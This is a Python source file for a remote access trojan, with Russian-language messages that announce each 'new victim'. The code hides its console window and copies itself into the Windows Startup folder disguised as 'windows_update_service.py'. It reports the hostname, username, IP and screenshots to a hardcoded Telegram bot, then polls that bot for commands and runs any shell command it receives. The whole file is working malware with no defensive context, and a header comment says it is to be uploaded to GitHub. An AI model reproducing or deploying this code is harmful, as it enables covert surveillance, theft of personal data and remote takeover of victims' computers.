# real_rat.py - этот файл загружаешь на GitHub
import os
import platform
import requests
import subprocess
import time
import shutil
import socket

try:
    from PIL import ImageGrab
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow -q -q -q")
        from PIL import ImageGrab
    elif platform.system().startswith("Linux"):
        os.system("python3 -m pip install pillow -q -q -q")
        from PIL import ImageGrab

BOT_TOKEN = "7541654814:AAH8qZQ7lTfG94kK-9pXq7W4M2n1rJ3sT8L"
CHAT_ID = "684925817"

class RealRAT:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.victim_id = socket.gethostname()
        
    def hide_console(self):
        try:
            if platform.system().startswith("Windows"):
                import win32gui
                import win32con
                window = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(window, win32con.SW_HIDE)
        except:
            pass

    def setup_persistence(self):
        try:
            if platform.system().startswith("Windows"):
                appdata = os.getenv('APPDATA')
                startup_dir = os.path.join(appdata, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                
                script_path = os.path.abspath(__file__)
                target_path = os.path.join(startup_dir, 'windows_update_service.py')
                
                if not os.path.exists(target_path):
                    shutil.copy2(script_path, target_path)
                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True, capture_output=True)
                    
        except Exception as e:
            pass

    def send_to_telegram(self, text):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            params = {'chat_id': self.chat_id, 'text': text}
            requests.get(url, params=params, timeout=10)
        except:
            pass

    def send_file_to_telegram(self, filename):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            with open(filename, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': self.chat_id}
                requests.post(url, data=data, files=files, timeout=10)
        except:
            pass

    def collect_system_info(self):
        try:
            ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
            info = f"""🎯 НОВАЯ ЖЕРТВА!

💻 Компьютер: {self.victim_id}
👤 Пользователь: {os.getlogin()}
🌐 IP адрес: {ip}
🖥️ Система: {platform.system()} {platform.release()}

🚀 RAT активирована!"""
            return info
        except:
            return f"🎯 НОВАЯ ЖЕРТВА! {self.victim_id} - {os.getlogin()}"

    def take_screenshot(self):
        try:
            file_path = "screen.png"
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            self.send_file_to_telegram(file_path)
            os.remove(file_path)
            return True
        except:
            return False

    def execute_command(self, command):
        try:
            if command == 'screenshot':
                self.take_screenshot()
                return "📸 Скриншот отправлен"
            elif command == 'info':
                return self.collect_system_info()
            elif command == 'location':
                ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
                return f"🌐 IP: {ip}"
            elif command.startswith('cmd '):
                cmd = command[4:].strip()
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                return result.decode('utf-8', errors='ignore').strip()
            else:
                return "❌ Неизвестная команда"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"

    def check_commands(self):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if 'result' in data:
                    for update in data['result']:
                        if 'message' in update and 'text' in update['message']:
                            message_text = update['message']['text']
                            if message_text.startswith(f"{self.victim_id}:"):
                                command = message_text.split(':', 1)[1].strip()
                                result = self.execute_command(command)
                                self.send_to_telegram(f"💻 {self.victim_id}:\n{result}")
        except:
            pass

    def start(self):
        self.hide_console()
        self.setup_persistence()
        time.sleep(10)
        system_info = self.collect_system_info()
        self.send_to_telegram(system_info)
        time.sleep(5)
        self.take_screenshot()
        
        while True:
            try:
                self.check_commands()
                time.sleep(10)
            except:
                time.sleep(30)
                continue

if __name__ == '__main__':
    rat = RealRAT()
    rat.start()
